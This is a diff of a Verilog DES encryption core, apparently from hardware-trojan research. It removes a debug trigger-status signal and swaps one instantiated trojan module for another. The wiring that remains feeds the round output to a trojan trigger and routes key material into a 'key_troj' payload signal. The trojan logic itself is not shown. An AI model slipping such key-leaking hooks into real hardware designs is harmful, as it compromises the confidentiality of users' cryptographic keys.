@@ -70,7 +70,6 @@ module des(clk_in, rst);
 	wire [55:0] key56;
 	reg [3:0] cnt;
 	wire clk;
-	wire [1:4] triggerstatus;
 	
 	divi Uclk(.clk(clk_in), .clkout(clk));
 	
@@ -83,15 +82,13 @@ module des(clk_in, rst);
 				.desIn(desIn), 
 				.key(key56), 
 				.decrypt(1'b0), 
-				.roundSel(cnt),
-				.triggerstatus(triggerstatus),
+				.roundSel(cnt), 
 				.clk(clk));
 				
 	ram1 U2(
 	.address({1'b0,cnt[3:0]}),
 	.clock(clk),
 	.data(desout),
-	//.data(triggerstatus),
 	.wren(1'b1),
 	.q());
 	
@@ -104,7 +101,7 @@ module des(clk_in, rst);
 endmodule
 
 
-module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
+module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	output	[63:0]	desOut;
 	input	[63:0]	desIn;
 	input	[55:0]	key;
@@ -119,7 +116,6 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	wire	[1:32]	Lout, Rout;
 	wire	[1:32]	out;
     wire    [55:0]  key_troj; // used to send payload
-	 output [1:4] triggerstatus;
 
 	assign Lout = (roundSel == 0) ? IP[33:64] : R;
 	assign Xin  = (roundSel == 0) ? IP[01:32] : L;
@@ -127,8 +123,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk,triggerstatus);
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
-	assign triggerstatus = out[29:32];
-    trojan_15 u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
+    trojan_0 u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
 
 	always @(posedge clk)
 			  L <= #1 Lout;
